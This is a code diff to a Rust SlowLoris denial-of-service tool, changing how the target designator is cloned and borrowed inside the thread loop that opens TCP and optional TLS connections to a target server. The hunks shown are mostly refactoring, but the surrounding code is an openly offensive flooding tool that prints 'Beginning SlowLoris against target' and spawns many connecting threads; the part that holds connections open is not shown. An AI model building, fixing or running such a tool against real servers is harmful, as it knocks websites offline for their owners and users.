@@ -76,7 +76,7 @@ fn main() {
     }else {false};
 
     let mut target = Target::new(domain, default_port);
-    let domain_optional = Option::from(domain);
+    let domain_optional = Option::from(target.clone().target_domain);
 
     // Set up rustls process global
     let mut ssl_config = rustls::ClientConfig::new();
@@ -88,7 +88,7 @@ fn main() {
     loop {
         println!(
             "Beginning SlowLoris against target {} with {} threads.",
-            target.get_designator(),
+            target.clone().get_designator(),
             threads
         );
         let mut handles = Vec::with_capacity(threads);
@@ -99,13 +99,14 @@ fn main() {
             handles.push(
                 thread::spawn(move || {
                     // Attempt to connect to the target.
-                    let mut tcp_stream = TcpStream::connect(target.get_designator())
+                    let mut tcp_stream = TcpStream::connect(target.clone().get_designator())
                         .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect. {}", threadn, e); panic!()});
-                    info!("[CONTROL:{}] Succesfully connected to {}.", threadn, target.get_designator());
+                    info!("[CONTROL:{}] Succesfully connected to {}.", threadn, target.clone().get_designator());
                     // If needed, connect SSL to the target.
                     if ssl {
                         // Attempt to connect SSL
-                        let tgt_domain = webpki::DNSNameRef::try_from_ascii_str(&target.get_designator())
+                        let domain_brrow= target.clone().get_designator();
+                        let tgt_domain = webpki::DNSNameRef::try_from_ascii_str(&domain_brrow)
                             .unwrap_or_else(|e| {
                                 error!("[CONTROL:{}] !!! Couldn't get DNS reference for domain. {}\nDid you provide a domain name, not an IP?", threadn, e);
                                 panic!();
